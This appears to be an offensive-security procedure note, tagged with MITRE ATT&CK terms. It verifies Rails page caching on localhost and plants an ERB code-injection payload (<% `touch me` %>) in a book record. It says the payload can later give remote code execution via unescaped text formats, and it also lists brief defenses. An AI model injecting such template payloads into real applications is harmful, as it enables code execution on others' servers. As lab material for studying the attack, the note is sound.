---
tags:
  - caching-verification
  - payload-creation
type: procedure
tools:
  - '[[tools/curl]]'
  - '[[tools/rails]]'
  - '[[tools/ls]]'
  - '[[tools/cat]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/rails-server-start]]'
  - '[[commands/curl-book-show]]'
  - '[[commands/ls-public-dir]]'
  - '[[commands/cat-cache-file]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:26:27.465Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: 48db8fb1-2ef2-46f8-afa8-99e3986bdd07
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Verify-Caching-Behavior-and-Create-Malicious-Payload

## Summary

This procedure starts the Rails server, creates a book record with a malicious ERB payload, accesses the show page to trigger caching, and verifies the cache file is generated correctly in the public directory.

## Description

To exploit, confirm normal caching works before traversal. The payload <% `touch me` %> is escaped in HTML cache but can be used unescaped in text formats for RCE. Use the web interface or console to create the book. Access via curl triggers cache write. Inspect with ls and cat.

## Requirements

1. Rails app setup and caching enabled
2. Localhost:3000 accessible
3. Browser or Rails console for book creation

## Defense

Defensive measures and detection strategies:

- Sanitize user inputs in cached content
- Use content security policies
- Monitor cache directory for unexpected files

## Objectives

1. Confirm caching generates files in public
2. Introduce payload for later exploitation

## Instructions

### Step 1: Start Rails Server

**Context**: Launch the app to enable interactions.

**Command** ([[commands/rails-server-start]]):
```bash
rails s
```

> Starts server on http://localhost:3000. Expected: Server running message.

### Step 2: Create Book with Payload and Trigger Cache

**Context**: Create book via /books (name: <% `touch me` %>), then fetch show page.

**Command** ([[commands/curl-book-show]]):
```bash
curl "http://localhost:3000/books/1"
```

> Triggers caching of show page. Expected: HTML response.

### Step 3: Inspect Cache Files

**Context**: Verify file creation.

**Command** ([[commands/ls-public-dir]]):
```bash
ls public
```

> Lists public contents. Expected: books/1.html present.

**Command** ([[commands/cat-cache-file]]):
```bash
cat public/books/1.html
```

> Shows escaped payload in HTML. Expected: &lt;% `touch me` %&gt;.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/rails-server-start]]
- [[commands/curl-book-show]]
- [[commands/ls-public-dir]]
- [[commands/cat-cache-file]]

## Tools Used

- [[tools/curl]]
- [[tools/rails]]
- [[tools/ls]]
- [[tools/cat]]

## Tags

- caching-verification
- payload-creation
